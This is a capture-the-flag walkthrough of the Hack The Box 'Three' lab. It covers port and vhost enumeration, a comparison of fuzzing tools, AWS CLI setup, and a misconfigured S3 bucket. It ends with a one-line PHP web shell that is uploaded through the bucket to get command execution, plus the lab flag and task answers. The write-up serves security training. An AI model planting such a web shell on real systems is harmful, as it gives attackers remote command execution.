---
tags:
  - STARTING_POINT
link: https://app.hackthebox.com/machines/Three
description: Very Easy·Linux
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/49fa1274ca631fd870e9feca35b7d7c2.png
date: 2026-06-13
solved: true
machine no.:
---
## Connect to Hack The Box

![[Pasted image 20260328013715.png|1093]]
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 1

How many TCP ports are open?
==2==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 2

What is the domain of the email address provided in the "Contact" section of the website?
==thetoppers.htb==

![[Pasted image 20260613190416.png]]
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 3

In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?
==/etc/hosts==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 4

Which sub-domain is discovered during further enumeration?
==Answer==

```shell
┌──(kali㉿kali)-[~]
└─$ gobuster vhost -u http://thetoppers.htb/ -w /usr/share/wordlists/seclists/Discovery/DN
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://thetoppers.htb/
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
s3.thetoppers.htb Status: 404 [Size: 21]
gc._msdcs.thetoppers.htb Status: 400 [Size: 306]
Progress: 4989 / 4989 (100.00%)
===============================================================
Finished
===============================================================
```

| Task                           | ffuf                                                                                  | gobuster                                                          | feroxbuster                                                 |
| ------------------------------ | ------------------------------------------------------------------------------------- | ----------------------------------------------------------------- | ----------------------------------------------------------- |
| Directory/file brute-force     | `ffuf -u http://target/FUZZ -w wordlist.txt -e .php,.html`                            | `gobuster dir -u http://target -w wordlist.txt -x php,html`       | `feroxbuster -u http://target -w wordlist.txt -x php,html`  |
| Vhost/subdomain fuzzing        | `ffuf -u http://target -H "Host: FUZZ.target.com" -w wordlist.txt -mc all -fs <size>` | `gobuster vhost -u http://target -w wordlist.txt --append-domain` | not a primary use case                                      |
| Show only certain status codes | `-mc 200,301,302`                                                                     | `-s 200,301,302`                                                  | `-s 200,301,302`                                            |
| Hide certain status codes      | `-fc 404`                                                                             | `-b 404` (default blacklist)                                      | `-C 404`                                                    |
| Filter by response size        | `-fs 1234` (also `-fw`, `-fl`)                                                        | not natively supported                                            | `-S 1234` (`--filter-size`), or `--filter-similar-to <url>` |
| Threads                        | `-t 50` (default 40)                                                                  | `-t 50` (default 10)                                              | `-t 50` (default 50)                                        |
| Recursive scanning             | `-recursion -recursion-depth 1`                                                       | not built into `dir` mode                                         | recursive by default; `--depth N` to limit, `-n` to disable |
| Save output to file            | `-o results.json -of json`                                                            | `-o results.txt`                                                  | `-o results.txt`                                            |
| Custom headers/cookies         | `-H "Cookie: session=abc"`                                                            | `-H "Cookie: session=abc"` or `-c "session=abc"`                  | `-H "Cookie: session=abc"`                                  |
| Rate limiting                  | `-rate 100`                                                                           | not natively supported                                            | `--rate-limit 100`                                          |
| Quiet/minimal output           | `-s`                                                                                  | `-q`                                                              | `-q`                                                        |
| Wordlist                       | `-w wordlist.txt`                                                                     | `-w wordlist.txt`                                                 | `-w wordlist.txt`                                           |

The row that bit you earlier — default status-code matching — is the biggest practical difference: ffuf actively **matches** a specific allowlist by default (so unexpected codes like 404 get hidden unless you add `-mc all`), while gobuster and feroxbuster work the opposite way, **showing everything except a small blacklist** (mainly 404) by default. Worth keeping in mind any time results look suspiciously sparse or suspiciously complete.

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 5

Which service is running on the discovered sub-domain?
==Amazon S3==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## Task 6

Which command line utility can be used to interact with the service running on the discovered sub-domain?
==awscli==

```shell
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install
```

Then verify it worked:

```bash
aws --version
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## Task 7

Which command is used to set up the AWS CLI installation?
==aws configure==

```shell
┌──(kali㉿kali)-[~]
└─$ tldr aws     

  The official CLI tool for Amazon Web Services.
  Some subcommands such as `s3` have their own usage documentation.
  More information: <https://docs.aws.amazon.com/cli/latest/reference/>.

  Configure the AWS Command-line:

      aws configure wizard
      
...
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## Task 8

What is the command used by the above utility to list all of the S3 buckets?
==aws s3 ls==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## Task 9

This server is configured to run files written in what web scripting language?
==php==

```shell
┌──(kali㉿kali)-[~]
└─$ aws s3 ls --endpoint-url=http://s3.thetoppers.htb s3://thetoppers.htb

Could not connect to the endpoint URL: "http://s3.thetoppers.htb/thetoppers.htb?list-type=2&prefix=&delimiter=%2F&encoding-type=url"

┌──(kali㉿kali)-[~]
└─$ vi /etc/hosts     

┌──(kali㉿kali)-[~]
└─$ sudo vi /etc/hosts 
[sudo] password for kali: 

┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.129.61.120   thetoppers.htb
10.129.61.120   s3.thetoppers.htb

┌──(kali㉿kali)-[~]
└─$ aws s3 ls --endpoint-url=http://s3.thetoppers.htb s3://thetoppers.htb
                           PRE images/
2026-06-14 14:32:59          0 .htaccess
2026-06-14 14:33:00      11952 index.php
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## Submit Flag

Submit the flag located in /var/www/.
==a980d99281a28d638ac68b9bf9453c2b==

```shell
┌──(kali㉿kali)-[~]
└─$ vi shell.php  

┌──(kali㉿kali)-[~]
└─$ cat shell.php          
<?php system ($_GET['cmd']); ?>

┌──(kali㉿kali)-[~]
└─$ aws s3 cp --endpoint-url=http://s3.thetoppers.htb shell.php sc://thetoppers.htb

usage: aws s3 cp <LocalPath> <S3Uri> or <S3Uri> <LocalPath> or <S3Uri> <S3Uri>
Error: Invalid argument type

┌──(kali㉿kali)-[~]
└─$ aws s3 cp --endpoint-url=http://s3.thetoppers.htb shell.php s3://thetoppers.htb
upload: ./shell.php to s3://thetoppers.htb/shell.php             

┌──(kali㉿kali)-[~]
└─$ aws s3 ls --endpoint-url=http://s3.thetoppers.htb s3://thetoppers.htb          
                           PRE images/
2026-06-14 14:32:59          0 .htaccess
2026-06-14 14:33:00      11952 index.php
2026-06-14 16:39:24         32 shell.php
```

![[Pasted image 20260614234321.png]]

![[Pasted image 20260614234519.png]]

![[Pasted image 20260614234653.png]]
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## References

